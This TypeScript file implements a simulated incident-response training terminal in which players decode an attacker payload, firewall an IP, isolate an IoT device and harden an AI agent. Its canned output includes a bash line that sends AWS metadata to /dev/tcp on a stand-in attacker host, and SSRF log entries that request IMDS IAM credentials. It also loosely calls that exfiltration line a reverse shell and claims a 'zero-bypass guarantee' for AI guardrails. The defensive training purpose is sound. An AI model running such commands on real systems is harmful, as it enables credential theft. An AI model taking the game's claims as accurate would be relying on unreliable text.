// Interactive Terminal Virtual Environment & Command Shell

export interface TerminalOutputLine {
  text: string;
  type?: "standard" | "success" | "error" | "warning" | "info" | "command" | "system";
}

export interface DeviceContext {
  id: string;
  name: string;
  role: string;
  ip: string;
  hostname: string;
  status: "compromised" | "warning" | "secure";
  zone: "Command Center" | "Forensics Lab" | "Server Cold Room" | "IoT Edge Lab";
}

export interface MissionState {
  workstationAnalyzed: boolean;
  serverFirewalled: boolean;
  iotIsolated: boolean;
  aiAgentEnforced: boolean;
}

export class VirtualTerminal {
  public history: string[] = [];
  public historyIndex: number = -1;
  public lines: TerminalOutputLine[] = [];
  public currentDevice: DeviceContext;
  private onStateChange: (state: MissionState) => void;
  public missionState: MissionState;

  constructor(
    device: DeviceContext,
    missionState: MissionState,
    onStateChange: (state: MissionState) => void
  ) {
    this.currentDevice = device;
    this.missionState = { ...missionState };
    this.onStateChange = onStateChange;
    this.initWelcome();
  }

  setDevice(device: DeviceContext, missionState: MissionState) {
    this.currentDevice = device;
    this.missionState = { ...missionState };
    this.lines = [];
    this.initWelcome();
  }

  private initWelcome() {
    this.lines.push({
      text: "[SEC-OS v4.19-HARDENED] Authenticated session established",
      type: "system",
    });
    this.lines.push({
      text: `Host: ${this.currentDevice.hostname} (${this.currentDevice.ip}) · Node: ${this.currentDevice.name}`,
      type: "info",
    });
    this.lines.push({
      text: `Role: ${this.currentDevice.role} · Security Posture: ${this.currentDevice.status.toUpperCase()}`,
      type: this.currentDevice.status === "compromised" ? "error" : this.currentDevice.status === "warning" ? "warning" : "success",
    });
    this.lines.push({
      text: "Type 'help' to inspect available forensic utilities and commands.",
      type: "standard",
    });
    this.lines.push({ text: "", type: "standard" });
  }

  execute(rawCmd: string): void {
    const trimmed = rawCmd.trim();
    if (!trimmed) return;

    this.history.push(trimmed);
    this.historyIndex = this.history.length;

    this.lines.push({
      text: `${this.currentDevice.hostname}:~$ ${trimmed}`,
      type: "command",
    });

    const parts = trimmed.split(/\s+/);
    const cmd = parts[0].toLowerCase();
    const args = parts.slice(1);

    switch (cmd) {
      case "help":
        this.cmdHelp();
        break;
      case "clear":
        this.lines = [];
        break;
      case "status":
        this.cmdStatus();
        break;
      case "ls":
        this.cmdLs();
        break;
      case "cat":
        this.cmdCat(args);
        break;
      case "grep":
        this.cmdGrep(args);
        break;
      case "decode":
      case "base64":
        this.cmdDecode();
        break;
      case "analyze":
        this.cmdAnalyze();
        break;
      case "netstat":
      case "ss":
        this.cmdNetstat();
        break;
      case "ps":
      case "top":
        this.cmdPs();
        break;
      case "firewall":
      case "iptables":
        this.cmdFirewall();
        break;
      case "isolate":
      case "disconnect":
        this.cmdIsolate();
        break;
      case "zod-enforce":
      case "patch":
        this.cmdPatch();
        break;
      case "whoami":
        this.lines.push({ text: "secops-operator (UID 1000, GID 1000 - Incident Commander)", type: "standard" });
        break;
      case "uname":
        this.lines.push({ text: "Linux sec-node-01 6.8.0-45-generic #45-Ubuntu SMP PREEMPT_DYNAMIC x86_64", type: "standard" });
        break;
      case "date":
        this.lines.push({ text: new Date().toUTCString(), type: "standard" });
        break;
      default:
        this.lines.push({
          text: `bash: command not found: ${cmd}. Type 'help' for tactical reference.`,
          type: "error",
        });
    }
  }

  private cmdHelp() {
    this.lines.push({ text: "Tactical Incident Response Utilities:", type: "info" });
    this.lines.push({ text: "  status              Inspect current host posture & active alerts", type: "standard" });
    this.lines.push({ text: "  ls [-la] [path]     List evidence files, configs, and captured payloads", type: "standard" });
    this.lines.push({ text: "  cat <file>          Print contents of logs, dumps, or configurations", type: "standard" });
    this.lines.push({ text: "  grep <pattern> <f>  Search logs for suspicious indicators or IPs", type: "standard" });
    this.lines.push({ text: "  decode <file/str>   De-obfuscate Base64, Hex, and encoded payload vectors", type: "standard" });
    this.lines.push({ text: "  analyze <file>      Run automated malware heuristic / telemetry scan", type: "standard" });
    this.lines.push({ text: "  netstat             Display active TCP/UDP sockets and remote C2 connections", type: "standard" });
    this.lines.push({ text: "  ps                  List active processes and anomalous background daemons", type: "standard" });
    this.lines.push({ text: "  firewall drop <ip>  Block malicious IP / subnets at kernel netfilter", type: "standard" });
    this.lines.push({ text: "  isolate             Sever external network interfaces & wireless beacons", type: "standard" });
    this.lines.push({ text: "  zod-enforce         Deploy deterministic runtime schema to agent execution sink", type: "standard" });
    this.lines.push({ text: "  clear               Clear the terminal view", type: "standard" });
  }

  private cmdStatus() {
    if (this.currentDevice.id === "workstation") {
      this.lines.push({
        text: "[WORKSTATION-01]: High-compute forensics station.",
        type: "info",
      });
      if (this.missionState.workstationAnalyzed) {
        this.lines.push({ text: "✔ Task Complete: Malicious payload de-obfuscated. Attacker C2 IP identified.", type: "success" });
      } else {
        this.lines.push({ text: "⚠ PENDING: Un-analyzed obfuscated script located in /evidence/payload_b64.txt.", type: "warning" });
        this.lines.push({ text: "Action: Run 'decode /evidence/payload_b64.txt' or 'analyze payload_b64.txt'.", type: "standard" });
      }
    } else if (this.currentDevice.id === "server") {
      this.lines.push({
        text: "[SERVER-CORE-01]: High-availability data plane & auth syslog sink.",
        type: "info",
      });
      if (this.missionState.serverFirewalled) {
        this.lines.push({ text: "✔ Task Complete: Egress rule dropped attacker IP 10.10.42.99 & SSRF link-local metadata.", type: "success" });
      } else {
        this.lines.push({ text: "🚨 ALERT: Unauthorized outbound traffic & SSRF probes found in /var/log/nginx/access.log.", type: "error" });
        this.lines.push({ text: "Action: Run 'grep SSRF /var/log/nginx/access.log' then 'firewall drop 10.10.42.99'.", type: "standard" });
      }
    } else if (this.currentDevice.id === "iot") {
      this.lines.push({
        text: "[IOT-SMART-APPLIANCE]: Wi-Fi connected office edge node (Network Printer / Thermostat).",
        type: "info",
      });
      if (this.missionState.iotIsolated) {
        this.lines.push({ text: "✔ Task Complete: Wi-Fi radio severed. Unauthorized beacon neutralized.", type: "success" });
      } else {
        this.lines.push({ text: "🚨 ALERT: Unauthorized daemon beaconing to external C2 channel on port 4444.", type: "error" });
        this.lines.push({ text: "Action: Run 'ps' to inspect processes, then 'isolate' to disconnect rogue appliance.", type: "standard" });
      }
    } else if (this.currentDevice.id === "ai-agent") {
      this.lines.push({
        text: "[AI-AGENT-RUNNER]: Generative LLM tool-calling orchestration environment.",
        type: "info",
      });
      if (this.missionState.aiAgentEnforced) {
        this.lines.push({ text: "✔ Task Complete: Deterministic Zod AST gate enforced. Model injection quarantined.", type: "success" });
      } else {
        this.lines.push({ text: "🚨 ALERT: Indirect prompt injection payload bypassing probabilistic guardrails.", type: "error" });
        this.lines.push({ text: "Action: Run 'cat /app/agent_config.json' and 'zod-enforce' to harden execution.", type: "standard" });
      }
    }
  }

  private cmdLs() {
    if (this.currentDevice.id === "workstation") {
      this.lines.push({ text: "drwxr-xr-x 2 secops secops 4096 /evidence", type: "standard" });
      this.lines.push({ text: "-rw-r--r-- 1 secops secops 1204 /evidence/payload_b64.txt", type: "warning" });
      this.lines.push({ text: "-rw-r--r-- 1 secops secops 8420 /evidence/memory_dump_slice.bin", type: "standard" });
      this.lines.push({ text: "-rw-r--r-- 1 secops secops  680 /evidence/surveillance_capture.mp4", type: "standard" });
    } else if (this.currentDevice.id === "server") {
      this.lines.push({ text: "drwxr-xr-x 4 root root 4096 /var/log", type: "standard" });
      this.lines.push({ text: "-rw-r----- 1 root adm  9420 /var/log/nginx/access.log", type: "warning" });
      this.lines.push({ text: "-rw-r----- 1 root adm  3120 /var/log/auth.log", type: "standard" });
      this.lines.push({ text: "-rw-r--r-- 1 root root  420 /etc/firewall/rules.v4", type: "standard" });
    } else if (this.currentDevice.id === "iot") {
      this.lines.push({ text: "-rwxr-xr-x 1 root root 14200 /bin/busybox", type: "standard" });
      this.lines.push({ text: "-rwxr-xr-x 1 root root  2840 /tmp/.beacon_daemon", type: "error" });
      this.lines.push({ text: "-rw-r--r-- 1 root root   210 /etc/config/wifi.conf", type: "standard" });
    } else if (this.currentDevice.id === "ai-agent") {
      this.lines.push({ text: "-rw-r--r-- 1 agent agent  840 /app/agent_config.json", type: "warning" });
      this.lines.push({ text: "-rw-r--r-- 1 agent agent 1920 /app/tools/terminal_sink.ts", type: "standard" });
      this.lines.push({ text: "-rw-r--r-- 1 agent agent 4120 /var/log/agent_prompts.log", type: "standard" });
    }
  }

  private cmdCat(args: string[]) {
    if (!args[0]) {
      this.lines.push({ text: "cat: missing file operand", type: "error" });
      return;
    }
    const target = args[0];
    if (this.currentDevice.id === "workstation") {
      if (target.includes("payload")) {
        this.lines.push({ text: "--- BEGIN BASE64 ADVERSARIAL STAGE 1 PAYLOAD ---", type: "standard" });
        this.lines.push({ text: "IyEvYmluL2Jhc2gKY3VybCAtcyBodHRwOi8vMTY5LjI1NC4xNjkuMjU0L2xhdGVzdC9tZXRhLWRhdGEvIHwgZ3JlcCBzdG9sZW4gPiAvZGV2L3RjcC8xMC4xMC40Mi45OS80NDQ0", type: "warning" });
        this.lines.push({ text: "--- END BASE64 PAYLOAD ---", type: "standard" });
        this.lines.push({ text: "Hint: Run 'decode /evidence/payload_b64.txt' to evaluate instruction contents.", type: "info" });
      } else {
        this.lines.push({ text: "[BINARY DATA]: Stream encoding cannot be rendered in ASCII.", type: "standard" });
      }
    } else if (this.currentDevice.id === "server") {
      if (target.includes("access.log")) {
        this.lines.push({ text: '192.168.1.105 - - [21/Nov/2026:03:14:02] "GET /api/v1/invoices/9482 HTTP/1.1" 200 481', type: "standard" });
        this.lines.push({ text: '10.10.42.99 - - [21/Nov/2026:03:15:18] "POST /fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1" 200 1284 [SSRF EXPLOIT]', type: "error" });
        this.lines.push({ text: '10.10.42.99 - - [21/Nov/2026:03:15:24] "POST /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin HTTP/1.1" 200 2480 [CREDS EXFILTRATED]', type: "error" });
        this.lines.push({ text: "Hint: Run 'firewall drop 10.10.42.99' to sever the ingress route.", type: "info" });
      } else if (target.includes("rules")) {
        this.lines.push({ text: "*filter", type: "standard" });
        this.lines.push({ text: ":INPUT ACCEPT [0:0]", type: "standard" });
        this.lines.push({ text: ":FORWARD ACCEPT [0:0]", type: "standard" });
        this.lines.push({ text: ":OUTPUT ACCEPT [0:0]", type: "standard" });
        if (this.missionState.serverFirewalled) {
          this.lines.push({ text: "-A INPUT -s 10.10.42.99 -j DROP [ACTIVE RULE]", type: "success" });
          this.lines.push({ text: "-A OUTPUT -d 169.254.169.254 -j REJECT [ACTIVE RULE]", type: "success" });
        }
        this.lines.push({ text: "COMMIT", type: "standard" });
      }
    } else if (this.currentDevice.id === "iot") {
      if (target.includes("wifi")) {
        this.lines.push({ text: 'ssid="Corp_IoT_Guest_2.4G"', type: "standard" });
        this.lines.push({ text: 'status="ASSOCIATED"', type: "warning" });
        this.lines.push({ text: 'remote_gateway="10.10.42.99:4444" [BEACONING]', type: "error" });
      } else {
        this.lines.push({ text: "[ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV)]", type: "standard" });
      }
    } else if (this.currentDevice.id === "ai-agent") {
      this.lines.push({ text: "{", type: "standard" });
      this.lines.push({ text: '  "agent_id": "orchestrator-alpha",', type: "standard" });
      this.lines.push({ text: '  "model": "gpt-4o-probabilistic",', type: "standard" });
      this.lines.push({ text: `  "schema_enforcement": ${this.missionState.aiAgentEnforced ? '"ZOD_DETERMINISTIC_ACTIVE"' : '"DISABLED"'},`, type: this.missionState.aiAgentEnforced ? "success" : "error" });
      this.lines.push({ text: `  "taint_tracking": ${this.missionState.aiAgentEnforced ? "true" : "false"},`, type: this.missionState.aiAgentEnforced ? "success" : "error" });
      this.lines.push({ text: '  "max_tool_depth": 5', type: "standard" });
      this.lines.push({ text: "}", type: "standard" });
    }
  }

  private cmdGrep(args: string[]) {
    if (args.length < 2) {
      this.lines.push({ text: "Usage: grep <pattern> <file>", type: "error" });
      return;
    }
    const [pattern, file] = args;
    if (file.includes("access.log")) {
      this.lines.push({ text: `Searching /var/log/nginx/access.log for pattern: '${pattern}'...`, type: "info" });
      this.lines.push({ text: "MATCH: 10.10.42.99 [SSRF EXPLOIT] GET http://169.254.169.254/latest/meta-data/iam/credentials", type: "error" });
      this.lines.push({ text: "Attacker C2 source IP confirmed: 10.10.42.99", type: "warning" });
    } else {
      this.lines.push({ text: `grep: ${file}: No matches found.`, type: "standard" });
    }
  }

  private cmdDecode() {
    if (this.currentDevice.id !== "workstation") {
      this.lines.push({ text: "Warning: High-entropy payload decoding is constrained to high-compute forensic stations.", type: "warning" });
    }

    this.lines.push({ text: "[+] De-obfuscating Base64 instruction buffer...", type: "info" });
    this.lines.push({ text: "--------------------------------------------------------", type: "standard" });
    this.lines.push({ text: "#!/bin/bash", type: "standard" });
    this.lines.push({ text: "curl -s http://169.254.169.254/latest/meta-data/ | grep stolen > /dev/tcp/10.10.42.99/4444", type: "error" });
    this.lines.push({ text: "--------------------------------------------------------", type: "standard" });
    this.lines.push({ text: "SUCCESS: Malicious Bash reverse-shell vector uncovered!", type: "success" });
    this.lines.push({ text: "IOC Extracted: Attacker Host = 10.10.42.99 | Target = AWS IMDS Link-Local", type: "warning" });

    if (!this.missionState.workstationAnalyzed) {
      this.missionState.workstationAnalyzed = true;
      this.onStateChange(this.missionState);
      this.lines.push({ text: "🎯 OBJECTIVE 1 HIT: Forensic payload successfully de-obfuscated!", type: "success" });
    }
  }

  private cmdAnalyze() {
    this.cmdDecode();
  }

  private cmdNetstat() {
    this.lines.push({ text: "Proto Recv-Q Send-Q Local Address           Foreign Address         State", type: "standard" });
    this.lines.push({ text: "tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN", type: "standard" });
    this.lines.push({ text: "tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN", type: "standard" });
    if (!this.missionState.serverFirewalled) {
      this.lines.push({ text: "tcp        0   1420 192.168.1.10:443       10.10.42.99:51842       ESTABLISHED [ANOMALOUS]", type: "error" });
    }
    if (this.currentDevice.id === "iot" && !this.missionState.iotIsolated) {
      this.lines.push({ text: "tcp        0    840 192.168.1.185:49182     10.10.42.99:4444        ESTABLISHED [C2 BEACON]", type: "error" });
    }
  }

  private cmdPs() {
    this.lines.push({ text: "PID   USER     COMMAND", type: "standard" });
    this.lines.push({ text: "1     root     /sbin/init", type: "standard" });
    this.lines.push({ text: "412   root     /usr/sbin/sshd -D", type: "standard" });
    this.lines.push({ text: "892   nginx    nginx: worker process", type: "standard" });
    if (this.currentDevice.id === "iot" && !this.missionState.iotIsolated) {
      this.lines.push({ text: "1842  root     /tmp/.beacon_daemon --connect 10.10.42.99:4444", type: "error" });
    }
  }

  private cmdFirewall() {
    if (this.currentDevice.id !== "server") {
      this.lines.push({ text: "Error: Netfilter kernel rule alteration requires Core Server access.", type: "error" });
      return;
    }

    this.lines.push({ text: "[+] Applying iptables -A INPUT -s 10.10.42.99 -j DROP...", type: "info" });
    this.lines.push({ text: "[+] Dropping link-local metadata egress route (169.254.169.254/32)...", type: "info" });
    this.lines.push({ text: "[+] Enforcing AWS IMDSv2 token challenge on all container instances...", type: "success" });

    if (!this.missionState.serverFirewalled) {
      this.missionState.serverFirewalled = true;
      this.onStateChange(this.missionState);
      this.lines.push({ text: "🎯 OBJECTIVE 2 HIT: Malicious C2 dropped & IMDS SSRF barrier enforced!", type: "success" });
    }
  }

  private cmdIsolate() {
    if (this.currentDevice.id === "iot") {
      this.lines.push({ text: "[+] Bringing down wlan0 interface...", type: "info" });
      this.lines.push({ text: "[+] Killing process 1842 (/tmp/.beacon_daemon)...", type: "warning" });
      this.lines.push({ text: "[+] Revoking 802.11 b/g/n association to Corp_IoT_Guest...", type: "info" });
      this.lines.push({ text: "✔ Host successfully severed from internal office subnet.", type: "success" });

      if (!this.missionState.iotIsolated) {
        this.missionState.iotIsolated = true;
        this.onStateChange(this.missionState);
        this.lines.push({ text: "🎯 OBJECTIVE 3 HIT: Rogue IoT device isolated and beacon neutralized!", type: "success" });
      }
    } else {
      this.lines.push({ text: `Host ${this.currentDevice.hostname} placed in restricted diagnostic vLAN.`, type: "standard" });
    }
  }

  private cmdPatch() {
    if (this.currentDevice.id !== "ai-agent") {
      this.lines.push({ text: "Notice: Deterministic AI guardrail patching is applied on the Agent Execution Node.", type: "warning" });
      return;
    }

    this.lines.push({ text: "[+] Injecting Zod deterministic schema parser into tool-execution pipeline...", type: "info" });
    this.lines.push({ text: "[+] Applying runtime AST taint-tracking to untrusted retrieval tokens...", type: "info" });
    this.lines.push({ text: "[+] Enforcing parameter immutability and schema constraint boundaries...", type: "success" });

    if (!this.missionState.aiAgentEnforced) {
      this.missionState.aiAgentEnforced = true;
      this.onStateChange(this.missionState);
      this.lines.push({ text: "🎯 OBJECTIVE 4 HIT: Generative AI Agent execution plane hardened with zero-bypass guarantee!", type: "success" });
    }
  }
}
